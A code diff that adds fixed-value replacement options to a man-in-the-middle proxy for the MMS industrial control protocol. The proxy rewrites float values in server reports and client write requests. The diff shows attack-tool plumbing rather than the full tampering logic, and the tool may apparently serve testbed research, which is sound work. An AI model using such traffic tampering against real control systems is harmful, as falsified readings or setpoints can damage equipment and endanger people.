@@ -11,7 +11,9 @@ import socket
 import sys
 import argparse
 import logging
+import math
 import re
+import struct
 import time
 from enum import Enum
 from threading import Thread
@@ -73,6 +75,8 @@ class MmsDirectProxy:
         write_float_percentage=None,
         write_float_path_regex=None,
         modification_delay=0.0,
+        report_float_value=None,
+        write_float_value=None,
     ):
         self.listen_port = listen_port
         self.server_host = server_host
@@ -81,10 +85,12 @@ class MmsDirectProxy:
         self.modify_report_floats = modify_report_floats
         self.report_float_delta = report_float_delta
         self.report_float_percentage = report_float_percentage
+        self.report_float_value = report_float_value
         self.report_float_path_regex = report_float_path_regex
         self.modify_write_floats = modify_write_floats
         self.write_float_delta = write_float_delta
         self.write_float_percentage = write_float_percentage
+        self.write_float_value = write_float_value
         self.write_float_path_regex = write_float_path_regex
         self.modification_delay = modification_delay
         self.started_at = None
@@ -115,13 +121,15 @@ class MmsDirectProxy:
                 self.report_float_delta,
                 self.report_float_path_regex,
                 self.report_float_percentage,
+                fixed_value=self.report_float_value,
             )
             if changed_count:
-                op = (
-                    f"{self.report_float_percentage:g}%"
-                    if self.report_float_percentage is not None
-                    else f"+{self.report_float_delta:g}"
-                )
+                if self.report_float_value is not None:
+                    op = f"={self.report_float_value:g}"
+                elif self.report_float_percentage is not None:
+                    op = f"{self.report_float_percentage:g}%"
+                else:
+                    op = f"+{self.report_float_delta:g}"
                 if self.report_float_path_regex:
                     logger.info(
                         f"[{label}] Rewrote {changed_count} float value(s) with {op} "
@@ -151,13 +159,15 @@ class MmsDirectProxy:
                 self.write_float_delta,
                 self.write_float_path_regex,
                 self.write_float_percentage,
+                fixed_value=self.write_float_value,
             )
             if changed_count:
-                op = (
-                    f"{self.write_float_percentage:g}%"
-                    if self.write_float_percentage is not None
-                    else f"+{self.write_float_delta:g}"
-                )
+                if self.write_float_value is not None:
+                    op = f"={self.write_float_value:g}"
+                elif self.write_float_percentage is not None:
+                    op = f"{self.write_float_percentage:g}%"
+                else:
+                    op = f"+{self.write_float_delta:g}"
                 if self.write_float_path_regex:
                     logger.info(
                         f"[{label}] Rewrote {changed_count} write-request float value(s) "
@@ -409,6 +419,18 @@ class MmsDirectProxy:
             server_socket.close()
 
 
+def _finite_float32(value):
+    """Validate that a CLI replacement value can be encoded as a finite MMS float."""
+    try:
+        parsed = float(value)
+        if not math.isfinite(parsed):
+            raise ValueError
+        struct.pack(">f", parsed)
+    except (ValueError, OverflowError, struct.error):
+        raise argparse.ArgumentTypeError("value must be a finite 32-bit float") from None
+    return parsed
+
+
 def main(argv=None):
     parser = argparse.ArgumentParser(
         description='MITM MMS Proxy - forwards traffic without SSLproxy or iptables'
@@ -431,7 +453,7 @@ def main(argv=None):
     )
     parser.add_argument(
         '--modify-report-floats', action='store_true',
-        help='Add +21 to float values inside UnconfirmedPDU reports (server→client only)'
+        help='Modify float values inside UnconfirmedPDU reports (server→client only; default: add 21)'
     )
     parser.add_argument(
         '--report-float-delta', type=float, default=21.0,
@@ -440,6 +462,10 @@ def main(argv=None):
     parser.add_argument(
         '--report-float-percentage', type=float, default=None,
         help='Percentage applied to report float values relative to base value (e.g. 10 means +10%%)'
+    )
+    parser.add_argument(
+        '--report-float-value', type=_finite_float32, default=None,
+        help='Fixed replacement for targeted report floats; overrides percentage and delta'
     )
     parser.add_argument(
         '--report-float-path-regex', default=None,
@@ -456,6 +482,10 @@ def main(argv=None):
     parser.add_argument(
         '--write-float-percentage', type=float, default=None,
         help='Percentage applied to write-request float values relative to base value (e.g. -5 means -5%%)'
+    )
+    parser.add_argument(
+        '--write-float-value', type=_finite_float32, default=None,
+        help='Fixed replacement for targeted write-request floats; overrides percentage and delta'
     )
     parser.add_argument(
         '--write-float-path-regex', default=None,
@@ -491,10 +521,12 @@ def main(argv=None):
         modify_report_floats=args.modify_report_floats,
         report_float_delta=args.report_float_delta,
         report_float_percentage=args.report_float_percentage,
+        report_float_value=args.report_float_value,
         report_float_path_regex=args.report_float_path_regex,
         modify_write_floats=args.modify_write_floats,
         write_float_delta=args.write_float_delta,
         write_float_percentage=args.write_float_percentage,
+        write_float_value=args.write_float_value,
         write_float_path_regex=args.write_float_path_regex,
         modification_delay=args.modification_delay,
     )
